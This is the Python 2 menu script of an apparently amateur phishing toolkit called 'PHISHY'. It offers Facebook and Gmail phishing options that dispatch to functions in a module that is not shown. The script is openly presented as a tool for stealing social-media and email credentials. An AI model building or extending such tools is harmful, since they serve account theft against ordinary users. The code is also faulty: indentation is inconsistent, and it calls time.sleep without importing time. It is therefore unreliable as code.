import os
import sys
from core.starkcore import *
from time import sleep as timeout
from termcolor import colored

def printslow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)

def menu():
 os.system("clear")
 print(colored("""

 .########..##.....##.####..######..##.....##.##....##
 .##.....##.##.....##..##..##....##.##.....##..##..##.
 .##.....##.##.....##..##..##.......##.....##...####..
 .########..#########..##...######..#########....##...
 .##........##.....##..##........##.##.....##....##...
 .##........##.....##..##..##....##.##.....##....##...
 .##........##.....##.####..######..##.....##....##...
 
                                                      
>>>>>>created by aniket stark    
>>>>>> GamersTech330 (youtube channel)
Thanks to Sagar Tripathirock
=============================================
1. Facebook phishing
2. Facebook attractive phishing
3. Gmail phishing
4. Update
=============================================
5. Exit
=============================================
""", "green"))

loop = True

while loop:
	menu()
        stark = raw_input("stark > ")
	
	if stark == "1":
		fbanner()
	elif stark == "2":
		fbab()
	elif stark == "3":
		gmailb()
	elif stark == "4":
		Update()
	elif stark == "5":
		sys.exit()
	elif stark == "0":
          restartprogram()
        else:
                  print  (colored("ERROR: WRONG COMMAND BRO.?", 'red'))
                  timeout(1)
                  restartprogram()


	

